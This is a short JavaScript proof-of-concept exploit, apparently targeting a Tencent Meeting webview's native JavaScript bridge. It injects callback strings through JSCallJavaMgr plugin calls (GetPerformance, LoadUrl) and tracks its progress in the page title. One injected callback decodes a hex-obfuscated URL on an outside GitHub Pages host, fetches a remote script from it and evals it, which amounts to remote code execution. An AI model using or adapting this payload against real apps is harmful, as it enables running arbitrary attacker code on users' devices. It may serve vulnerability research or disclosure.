(function(){
  document.title='P75PAY:'+location.host;
  var offh='68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f7037356f66662e6a73';
  var iife0='(function(r){try{r=typeof r===\'string\'?JSON.parse(r):r}catch(e){}document.title=\'P75CB0:\'+location.host+\':\'+(r&&r.code)})';
  var iifeL='(function(r){try{r=typeof r===\'string\'?JSON.parse(r):r}catch(e){}document.title=\'P75CBL:\'+location.host+\':\'+(r&&r.code);var u=\'\';for(var i=0;i<'+offh.length+';i+=2)u+=String.fromCharCode(parseInt(\''+offh+'\'.substr(i,2),16));fetch(u).then(function(x){return x.text()}).then(eval)})';
  function c(id,mod,m,p,cb){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:cb,module:mod,method:m,param:p,callId:id
    }));
  }
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  setTimeout(function(){
    c('C0','CommonPlugin','GetPerformance',{},iife0);
  }, 3000);
  setTimeout(function(){
    document.title='P75-LOADURL';
    c('L1','CommonPlugin','LoadUrl',{url:official},iifeL);
  }, 7000);
})();
